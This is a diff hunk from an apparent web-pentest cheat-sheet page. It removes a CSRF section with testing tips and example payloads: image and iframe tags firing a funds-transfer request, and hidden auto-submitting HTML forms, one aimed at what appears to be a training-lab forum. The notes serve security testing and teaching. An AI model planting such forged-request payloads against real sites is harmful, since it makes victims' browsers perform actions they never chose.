@@ -264,60 +264,6 @@ BULK INSERT
 * [PentestMonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
 * [SQLInjection Wiki](http://www.sqlinjectionwiki.com)
 
-> **CSRF**
-
-Look for:
-1. No CSRF Token
-2. Actions that perform a sensitive or important action
-	* Network Devices to allow bad guys to come in
-3. Transaction that contains predictable parameters
-
-> **CSRF Exploits**
-
-With ZAP:
-1. Right Click on the request in the history
-2. Generate Anti CSRF Test From
-3. In a logged in session test form
-
-*Burp also has one in the pro version*
-
-{% highlight html %}
-GET:
-Image tag 
-<img src="https://a.tld/t.php?acct=12345&amt=1000">
-
-IFRAME
-<iframe src="https;//a.tld/t.php?acct=12345&amt1000">
-
-POST:
-{% highlight html %}
-<form  ID=CSRF action="<website>" method="POST">
-<input type="hidden" name="<paramater>" value="<value>"/>
-<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
-       tabindex="-1"/>
-</form>
-<script>document.getElementById('CSRF').submit();</script>
-
-CSS or Javascript import 
-
-XMLHTTPRequest
-{% endhighlight %}
-
-{% highlight html %}
-<html>
-<body onload="f1.submit()";>
-<h3>http://www.sec542.org/sec542_oldforum/posting.php</h3><form id="f1" method="POST" action="http://www.sec542.org/sec542_oldforum/posting.php">
-<table>
-<tr><td>
-post<td><input name="post" value="Submit" size="100"></tr>
-<tr><td>
-message<td><input name="message" value="test :D " size="100"></tr>
-</table>
-</form>
-<button onclick="document.getElementById('f1').submit()">Submit</button>
-</body>
-</html>
-{% endhighlight %}
 
 > **Web Shells**
 
